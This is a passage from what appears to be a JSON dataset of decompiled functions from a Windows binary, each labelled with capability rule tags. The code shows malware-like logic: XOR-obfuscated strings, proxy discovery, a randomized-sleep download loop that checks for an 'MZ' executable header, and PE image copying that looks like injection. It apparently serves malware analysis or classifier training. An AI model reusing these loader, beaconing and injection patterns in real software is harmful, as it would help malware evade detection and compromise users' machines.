cVar2 = *pcVar5;\n                    }\n                    *pcVar5 = '\\0';\n                    iVar4 = (*_sym.imp.KERNEL32.dll_lstrcmpiA)(pcVar7, in_EDX);\n                    if (iVar4 == 0) goto code_r0x00402293;\ncode_r0x0040227e:\n                    puVar8 = puVar8 + 0x48;\n                    var_8h = var_8h + 1;\n                } while (var_8h < *puVar3);\n                uVar6 = 2;\n            }\n            goto code_r0x004022b4;\n        }\n    }\n    uVar6 = 8;\ncode_r0x004022b4:\n    if (puVar3 != NULL) {\n        (*_sym.imp.KERNEL32.dll_VirtualFree)(puVar3, 0, 0x8000);\n    }\n    return uVar6;\n}\n",
        "token_count": 819
    },
    "0040278e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __fastcall fcn.0040278e(int32_t param_1)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_4h = 0;\n    var_10h = param_1;\n    if (*0x41dae0 == NULL) {\n        var_28h = 0x1a12400c;\n        var_24h = 0x63715f42;\n        var_20h = 0xc561a37;\n        var_1ch._0_2_ = 0x4036;\n        var_1ch._2_1_ = 0x45;\n        var_18h = 0x75453345;\n        var_14h._0_2_ = 0x6935;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x10);\n        iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar7 = 0;\n        var_ch = iVar4;\n        do {\n            iVar5 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n            if (iVar5 != 0x8ac748) {\n                var_8h = 6;\n                *(iVar7 + iVar4) = *(&var_18h + iVar7 % 6) ^ (iVar7 + iVar4)[&var_28h - iVar4];\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < 0xf);\n        var_28h = 0x1622330d;\n        var_24h = 0x62650a26;\n        var_20h = 0x3a0a2756;\n        var_1ch._0_2_ = CONCAT11(var_1ch._1_1_, 0x50);\n        var_18h = 0x78505666;\n        var_14h._0_2_ = CONCAT11(var_14h._1_1_, 0x43);\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n        iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar7 = 0;\n        var_8h = &var_28h - iVar4;\n        do {\n            iVar6 = (*_sym.imp.USER32.dll_ReleaseCapture)();\n            iVar5 = var_ch;\n            if (iVar6 != 0xba32d9) {\n                var_8h = 5;\n                *(iVar7 + iVar4) = *(&var_18h + iVar7 % 5) ^ (iVar7 + iVar4)[&var_28h - iVar4];\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < 0xd);\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar4, var_ch);\n        *0x41dae0 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n        pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n        pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        uVar3 = (*pcVar2)(0, iVar5);\n        (*pcVar1)(uVar3);\n        if (*0x41dae0 == NULL) {\n            return var_4h;\n        }\n    }\n    if ((var_10h != 0) && (iVar4 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x400, 0, var_10h),  iVar4 != 0)) {\n        iVar7 = (**0x41dae0)(iVar4, &var_4h);\n        var_4h = var_4h & -(iVar7 != 0);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar4);\n    }\n    return var_4h;\n}\n",
        "token_count": 1018
    },
    "004038a8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.004038a8(uint param_1, uchar *param_2)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint uVar6;\n    int32_t iVar7;\n    uint uVar8;\n    uint *puVar9;\n    uint pszFile;\n    uint32_t pAutoProxyOptions;\n    uint32_t var_58h;\n    int32_t var_54h;\n    uint var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    int32_t pProxyConfig;\n    int32_t var_38h;\n    int32_t var_34h;\n    int32_t var_30h;\n    uint32_t pszSrch;\n    int32_t var_28h;\n    uchar *psz1;\n    int32_t lpcwszUrl;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint pProxyInfo;\n    int32_t psz2;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_14h = 0;\n    puVar9 = &pProxyConfig;\n    psz1 = param_2;\n    for (iVar7 = 4; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    puVar9 = &pszFile;\n    for (iVar7 = 0x208; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    for (iVar7 = 0x208; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *param_2 = 0;\n        param_2 = param_2 + 1;\n    }\n    iVar7 = (*_sym.imp.WINHTTP.dll_WinHttpGetIEProxyConfigForCurrentUser)(&pProxyConfig);\n    if ((iVar7 != 0) && (iVar7 = fcn.00403bf8(),  iVar7 != 0)) {\n        iVar7 = 6;\n        uVar8 = 1;\n        var_44h = 6;\n        if (((pProxyConfig != 0) || (var_38h != 0)) &&\n           (iVar4 = (*_sym.imp.WINHTTP.dll_WinHttpOpen)(0, 1, 0, 0, 0),  iVar4 != 0)) {\n            puVar9 = &pAutoProxyOptions;\n            for (; iVar7 != 0; iVar7 = iVar7 + -1) {\n                *puVar9 = 0;\n                puVar9 = puVar9 + 1;\n            }\n            if (pProxyConfig != 0) {\n                pAutoProxyOptions = pAutoProxyOptions | 1;\n                var_58h = var_58h | 1;\n            }\n            if (var_38h != 0) {\n                pAutoProxyOptions = pAutoProxyOptions | 2;\n                var_54h = var_38h;\n            }\n            var_48h = 1;\n            puVar9 = &pProxyInfo;\n            for (iVar7 = 4; iVar7 != 0; iVar7 = iVar7 + -1) {\n                *puVar9 = 0;\n                puVar9 = puVar9 + 1;\n            }\n            iVar7 = (*_sym.imp.WINHTTP.dll_WinHttpGetProxyForUrl)(iVar4, lpcwszUrl, &pAutoProxyOptions, &pProxyInfo);\n            if ((iVar7 != 0) && (psz2 != 0)) {\n                (*_sym.imp.SHLWAPI.dll_StrCpyW)(psz1, psz2);\n                (*_sym.imp.WINHTTP.dll_WinHttpCloseHandle)(iVar4);\n                pcVar2 = _sym.imp.KERNEL32.dll_GlobalFree;\n                if (psz2 != 0) {\n                    (*_sym.imp.KERNEL32.dll_GlobalFree)(psz2);\n                }\n                if (var_8h != 0) {\n                    (*pcVar2)(var_8h);\n                }\n                goto code_r0x00403b9c;\n            }\n            (*_sym.imp.WINHTTP.dll_WinHttpCloseHandle)(iVar4);\n            pcVar2 = _sym.imp.KERNEL32.dll_GlobalFree;\n            if (psz2 != 0) {\n                (*_sym.imp.KERNEL32.dll_GlobalFree)(psz2);\n            }\n            if (var_8h != 0) {\n                (*pcVar2)(var_8h);\n            }\n        }\n        if (var_34h != 0) {\n            if (var_30h == 0) {\ncode_r0x00403a1e:\n                iVar7 = var_34h;\n                iVar4 = fcn.00409c60();\n                pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                if (iVar4 == 0) {\n                    (*_sym.imp.SHLWAPI.dll_StrCpyW)(psz1, iVar7);\n                    goto code_r0x00403b9c;\n                }\n                pProxyInfo = 0x4a31411f;\n                psz2 = 0x4531773e;\n                var_8h = 0x414d4a39;\n                var_4h._0_2_ = 0x4a45;\n                var_1ch = 0x4a454177;\n                var_18h._0_2_ = CONCAT11(var_18h._1_1_, 0x4a);\n                uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1d);\n                iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar8);\n                var_14h = 0;\n                var_28h = &pProxyInfo - iVar7;\n                pszSrch = iVar7;\n                do {\n                    iVar4 = (*_sym.imp.USER32.dll_GetMessagePos)();\n                    if (iVar4 != 0x82c68d) {\n                        var_40h = 5;\n                        *(var_14h + iVar7) = *(&var_1ch + var_14h % 5) ^ (var_14h + iVar7)[var_28h];\n                    }\n                    var_14h = var_14h + 1;\n                } while (var_14h < 0xe);\n                pProxyInfo = 0x5618373f;\n                psz2 = 0x37276433;\n                var_8h = 0x6447561f;\n                var_1ch = 0x566c3757;\n                var_18h._0_2_ = 0x6447;\n                uVar8 = (*pcVar2)(8, 0x19);\n                iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar8);\n                iVar4 = 0;\n                var_28h = &pProxyInfo - iVar7;\n                do {\n                    iVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n                    iVar3 = pszSrch;\n                    if (iVar5 != 0x3ab0be) {\n                        *(iVar4 + iVar7) = *(&var_1ch + iVar4 % var_44h) ^ (iVar4 + iVar7)[&pProxyInfo - iVar7];\n                    }\n                    iVar4 = iVar4 + 1;\n                } while (iVar4 < 0xc);\n                iVar4 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(lpcwszUrl, pszSrch);\n                pszSrch = iVar4 == lpcwszUrl;\n                var_14h = 0;\n                lpcwszUrl = fcn.00409bed(&var_14h);\n                uVar8 = 1;\n                while (pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap,  lpcwszUrl != 0) {\n                    iVar4 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(lpcwszUrl, iVar7);\n                    if ((pszSrch == (iVar4 == lpcwszUrl)) && (iVar4 = fcn.00409c60(),  iVar4 != 0)) {\n                        (*_sym.imp.SHLWAPI.dll_StrCpyW)(psz1, iVar4 + 2);\n                        uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar7);\n                        pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n                        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n                        uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n                        (*pcVar2)(uVar6);\n                        goto code_r0x00403b9c;\n                    }\n                    lpcwszUrl = fcn.00409bed(&var_14h);\n                }\n                uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar7);\n                pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n                uVar8 = (*pcVar2)(0, iVar3);\n                (*pcVar1)(uVar8);\n            }\n            else {\n                do {\n                    iVar7 = fcn.00409bed(&var_14h);\n                    if (iVar7 == 0) goto code_r0x00403a1e;\n                    iVar7 = (*_sym.imp.SHLWAPI.dll_PathMatchSpecW)(&pszFile, iVar7);\n                } while (iVar7 == 0);\n            }\n        }\n    }\n    uVar8 = 0;\ncode_r0x00403b9c:\n    pcVar2 = _sym.imp.KERNEL32.dll_GlobalFree;\n    if (var_38h != 0) {\n        (*_sym.imp.KERNEL32.dll_GlobalFree)(var_38h);\n    }\n    if (var_34h != 0) {\n        (*pcVar2)(var_34h);\n    }\n    if (var_30h != 0) {\n        (*pcVar2)(var_30h);\n    }\n    return uVar8;\n}\n",
        "token_count": 2298
    },
    "00403ed2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.00403ed2(void)\n\n{\n    uint32_t uVar1;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_24h = 0xaea3ed09;\n    uVar1 = 0;\n    var_20h = 0x2993125a;\n    var_1ch = 0x3d75a3ff;\n    var_18h = 0x662d9d39;\n    var_14h = 0x922df04;\n    var_10h = 0xc84f40f0;\n    var_ch = 0xdcfc6e80;\n    do {\n        var_8h = (&var_24h)[uVar1];\n        var_4h = 0;\n        fcn.00403c4c();\n        if (var_4h == 0) {\n            return 0;\n        }\n        uVar1 = uVar1 + 1;\n    } while (uVar1 < 7);\n    return 1;\n}\n",
        "token_count": 277
    },
    "0040533b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004053c0)\n// WARNING: Removing unreachable block (ram,0x004053d0)\n// WARNING: Removing unreachable block (ram,0x004053dd)\n// WARNING: Removing unreachable block (ram,0x004053ec)\n// WARNING: Removing unreachable block (ram,0x004053f1)\n// WARNING: Removing unreachable block (ram,0x004053fb)\n// WARNING: Removing unreachable block (ram,0x00405405)\n// WARNING: Removing unreachable block (ram,0x00405460)\n// WARNING: Removing unreachable block (ram,0x0040546d)\n// WARNING: Removing unreachable block (ram,0x00405483)\n// WARNING: Removing unreachable block (ram,0x0040548b)\n// WARNING: Removing unreachable block (ram,0x004055ae)\n// WARNING: Removing unreachable block (ram,0x004055bd)\n// WARNING: Removing unreachable block (ram,0x004055de)\n// WARNING: Removing unreachable block (ram,0x004055e4)\n// WARNING: Removing unreachable block (ram,0x00405636)\n// WARNING: Removing unreachable block (ram,0x00405614)\n// WARNING: Removing unreachable block (ram,0x00405638)\n\nuint __cdecl fcn.0040533b(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uchar *puVar2;\n    \n    puVar2 = 0x41db18;\n    for (iVar1 = 8; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    fcn.00405a4b();\n    (*_sym.imp.KERNEL32.dll_Sleep)();\n    while (*0x41ddd0 == 0) {\n        fcn.00405a4b();\n        iVar1 = fcn.004056a7();\n        if (iVar1 != 0) {\n            fcn.00409a4e();\n        }\n        (*_sym.imp.KERNEL32.dll_Sleep)();\n    }\n    return 0;\n}\n",
        "token_count": 468
    },
    "004056a7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nbool fcn.004056a7(void)\n\n{\n    bool bVar1;\n    code *pcVar2;\n    char cVar3;\n    uint uVar4;\n    char *pcVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    char *pcVar8;\n    int32_t iVar9;\n    uint *puVar10;\n    uint lpWSAData;\n    uint ARG_0;\n    uint var_74h;\n    int32_t var_70h;\n    uint32_t var_6ch;\n    uint32_t var_68h;\n    uint var_64h;\n    int32_t *var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3bh;\n    uint var_37h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint32_t var_24h;\n    char *var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    char *var_10h;\n    char *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_74h = *0x41db0c;\n    var_6ch = *0x41db50;\n    var_5ch = 0x3e263a36;\n    var_58h = 0x2d3f3134;\n    var_54h = 0x343c3b33;\n    var_50h = 0x273e3428;\n    var_4ch = 0x25293729;\n    var_48h = 0x22322e22;\n    var_44h = 0x68762d28;\n    var_14h = 5;\n    var_40h._0_1_ = 5;\n    stack0xffffffbd = 0x716b6560;\n    var_3bh = 0x6060676f;\n    var_37h._0_2_ = 0x6a7c;\n    var_37h._2_1_ = 0x51;\n    var_8h = 0x5a455857;\n    var_4h._0_1_ = 0x51;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x29);\n    pcVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar9 = 0;\n    var_10h = pcVar5;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n        if (iVar6 != 0xf31995) {\n            pcVar5[iVar9] = *(&var_8h + iVar9 % var_14h) ^ (pcVar5 + iVar9)[&var_5ch - pcVar5];\n        }\n        iVar9 = iVar9 + 1;\n    } while (iVar9 < 0x28);\n    (*_sym.imp.WS2_32.dll_WSAStartup)(0x201, &lpWSAData);\n    var_14h = 0;\n    var_ch = str.EFFDZ.;\n    do {\n        pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        var_8h = 0;\n        var_68h = 0;\n        iVar9 = 0;\n        var_64h = 1;\n        do {\n            if (var_ch[var_14h] != '\\0') {\n                cVar3 = *pcVar5;\n                pcVar8 = pcVar5;\n                while (cVar3 != var_ch[var_14h]) {\n                    if (cVar3 == '\\0') {\n                        bVar1 = false;\n                        goto code_r0x004057ba;\n                    }\n                    pcVar8 = pcVar8 + 1;\n                    cVar3 = *pcVar8;\n                }\n            }\n            iVar9 = iVar9 + 1;\n        } while (iVar9 < 0x20);\n        bVar1 = true;\ncode_r0x004057ba:\n        if (((*var_ch != '\\0') && (var_ch[0x1f] == '\\0')) && (bVar1)) {\n            stack0xffffffc8 = 0xd363462;\n            puVar10 = &ARG_0;\n            for (iVar9 = 0x40; iVar9 != 0; iVar9 = iVar9 + -1) {\n                *puVar10 = 0;\n                puVar10 = puVar10 + 1;\n            }\n            var_30h = 0x35243e47;\n            puVar10 = &var_24h;\n            for (iVar9 = 8; iVar9 != 0; iVar9 = iVar9 + -1) {\n                *puVar10 = 0;\n                puVar10 = puVar10 + 1;\n            }\n            var_2ch = 0x681a5c32;\n            var_28h._0_2_ = 0x4629;\n            var_1ch = 0x6846464d;\n            var_18h._0_2_ = 0x4d35;\n            uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xf);\n            iVar9 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n            iVar6 = 0;\n            var_70h = &var_37h + (3 - iVar9);\n            do {\n                iVar7 = (*_sym.imp.USER32.dll_CreatePopupMenu)();\n                if (iVar7 != 0x40108d) {\n                    var_64h = 6;\n                    *(iVar6 + iVar9) = *(&var_1ch + iVar6 % 6) ^ (iVar6 + iVar9)[var_70h];\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 0xe);\n            (*_sym.imp.USER32.dll_wsprintfA)(&ARG_0, iVar9, var_74h);\n            iVar6 = fcn.0040e75a(0, &ARG_0, &var_68h, &var_8h, 0x50);\n            if (iVar6 == 0) {\n                if (var_68h == 0) {\n                    fcn.00409a4e();\n                    uVar4 = (*pcVar2)(0, iVar9);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n                    break;\n                }\n                if (var_24h < var_68h) {\n                    fcn.00409a4e();\n                    var_6ch = var_6ch * 0x19660d + 0x3c6ef35f;\n                    (*_sym.imp.KERNEL32.dll_Sleep)(var_6ch % 600000 + 60000);\n                }\n                else if (((4 < var_68h) && (var_68h == var_24h)) &&\n                        ((var_20h != NULL && ((*var_20h == 'M' && (var_20h[1] == 'Z')))))) {\n                    fcn.00409639();\n                    fcn.00409a4e();\n                    uVar4 = (*pcVar2)(0, iVar9);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n                    break;\n                }\n            }\n            uVar4 = (*pcVar2)(0, iVar9);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n            pcVar5 = var_10h;\n        }\n        var_ch = var_ch + 0x20;\n        var_14h = var_14h + 1;\n    } while (var_ch < 0x413440);\n    iVar9 = *var_60h;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_10h);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    return iVar9 != 0;\n}\n",
        "token_count": 1832
    },
    "00407051": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00407051(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint in_ECX;\n    int32_t *piVar2;\n    int32_t *in_EDX;\n    int32_t iVar3;\n    uchar *puVar4;\n    uint32_t uVar5;\n    uchar *puVar6;\n    int32_t *piVar7;\n    code *pcVar8;\n    uint var_24h;\n    code *var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t hObject;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    var_4h = 0;\n    hObject = 0;\n    var_20h = fcn.0040d850;\n    (*_sym.imp.KERNEL32.dll_GetVersion)();\n    piVar2 = in_EDX;\n    if (((arg_8h & 0x10) == 0) && ((*0x41dad8 & 1) != 0)) {\n        var_20h = 0x413010;\n        piVar2 = in_EDX + 2;\n    }\n    iVar3 = *piVar2;\n    if (iVar3 == 0) {\n        iVar3 = 2;\n    }\n    else {\n        uVar5 = *(*(iVar3 + 0x3c) + 0x50 + iVar3) + 0xfffU & 0xfffff000;\n        iVar3 = fcn.0040616d(&hObject);\n        if (((iVar3 == 0) && (iVar3 = fcn.00405eb2(&var_4h),  iVar3 == 0)) &&\n           (iVar3 = fcn.00406012(var_4h),  iVar3 == 0)) {\n            iVar1 = uVar5 + var_8h;\n            puVar4 = *in_EDX;\n            puVar6 = uVar5 + 0xc50 + var_8h;\n            for (iVar3 = in_EDX[4]; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar6 = *puVar4;\n                puVar4 = puVar4 + 1;\n                puVar6 = puVar6 + 1;\n            }\n            puVar4 = in_EDX[2];\n            puVar6 = in_EDX[4] + var_8h + 0xc50 + uVar5;\n            for (iVar3 = in_EDX[5]; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar6 = *puVar4;\n                puVar4 = puVar4 + 1;\n                puVar6 = puVar6 + 1;\n            }\n            *(iVar1 + 0x30) = var_4h;\n            *(iVar1 + 0x34) = var_4h >> 0x1f;\n            piVar2 = in_EDX;\n            piVar7 = iVar1 + 0x18;\n            for (iVar3 = 0x18; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *piVar7 = *piVar2;\n                piVar2 = piVar2 + 1;\n                piVar7 = piVar7 + 1;\n            }\n            iVar3 = var_4h + 0xc50 + uVar5;\n            *(iVar1 + 0x18) = iVar3;\n            *(iVar1 + 0x1c) = iVar3 >> 0x1f;\n            iVar3 = in_EDX[4] + 0xc50 + uVar5 + var_4h;\n            *(iVar1 + 0x20) = iVar3;\n            *(iVar1 + 0x24) = iVar3 >> 0x1f;\n            *(iVar1 + 0x28) = in_EDX[4];\n            *(iVar1 + 0x2c) = in_EDX[5];\n            if (((arg_8h & 0x10) == 0) && ((*0x41dad8 & 1) != 0)) {\n                iVar3 = fcn.00406d1a();\n            }\n            else {\n                iVar3 = fcn.004069ca();\n            }\n            if (iVar3 == 0) {\n                pcVar8 = iVar1 + 0x40;\n                for (iVar3 = 0x800; iVar3 != 0; iVar3 = iVar3 + -1) {\n                    *pcVar8 = *var_20h;\n                    var_20h = var_20h + 1;\n                    pcVar8 = pcVar8 + 1;\n                }\n                iVar3 = fcn.00407219(in_ECX, var_4h + uVar5 + 0x40, var_4h + uVar5, arg_8h);\n            }\n        }\n        if (var_8h != 0) {\n            fcn.00405b1a();\n        }\n        if (hObject != 0) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 1164
    },
    "00409639": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00409639(int32_t *param_1, int32_t *param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uchar *puVar3;\n    int32_t iVar4;\n    uchar *puVar5;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if ((param_1 != NULL) && (param_2 != NULL)) {\n        if (param_1[1] != 0) {\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, param_1[1]);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        }\n        uVar2 = (*pcVar1)(8, *param_2);\n        puVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        param_1[1] = puVar3;\n        if (puVar3 != NULL) {\n            for (iVar4 = *param_2; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar3 = 0;\n                puVar3 = puVar3 + 1;\n            }\n            *param_1 = *param_2;\n            puVar3 = param_2[1];\n            puVar5 = param_1[1];\n            for (iVar4 = *param_2; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar5 = *puVar3;\n                puVar3 = puVar3 + 1;\n                puVar5 = puVar5 + 1;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 369
    },
    "00409a7f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00409a7f(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint psz2;\n    uint var_4h;\n    \n    psz2 = *0x41daac;\n    if (*0x41dbb4 != 0) {\n        return 1;\n    }\n    var_40h = 0x4511743d;\n    var_3ch = 0x740e6a35;\n    var_38h = 0x6a23450e;\n    var_34h = 0x45037404;\n    var_30h = 0x742f6a22;\n    var_2ch = 0x6a274531;\n    var_28h = 0x4510742b;\n    var_24h = 0x742e6a2a;\n    var_20h = 0x6a2a4531;\n    var_1ch = 0x45167429;\n    var_18h = 0x74256a26;\n    var_14h = 0x6a4f450c;\n    var_10h = 0x4562744a;\n    var_ch._0_2_ = 0x6a4f;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x61);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar5 = 0;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetCaretBlinkTime)();\n        if (iVar4 != 0x84e61e) {\n            var_4h = 6;\n            *(iVar5 + iVar3) = *(&var_10h + iVar5 % 6) ^ (iVar5 + iVar3)[&var_40h - iVar3];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x30);\n    *0x41dbb4 = (*_sym.imp.KERNEL32.dll_CreateFileMappingW)(0xffffffff, 0, 4, 0, 0x208, iVar3);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (*0x41dbb4 != 0) {\n        if ((*0x41dbb0 != 0) ||\n           (*0x41dbb0 = (*_sym.imp.KERNEL32.dll_MapViewOfFile)(*0x41dbb4, 0xf001f, 0, 0, 0x208),  *0x41dbb0 != 0)) {\n            (*_sym.imp.SHLWAPI.dll_StrCpyW)(*0x41dbb0, psz2);\n            uVar2 = (*pcVar1)(0, iVar3);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            return 1;\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(*0x41dbb4);\n        *0x41dbb4 = 0;\n    }\n    uVar2 = (*pcVar1)(0, iVar3);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    return 0;\n}\n",
        "token_count": 842
    },
    "0040a717": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
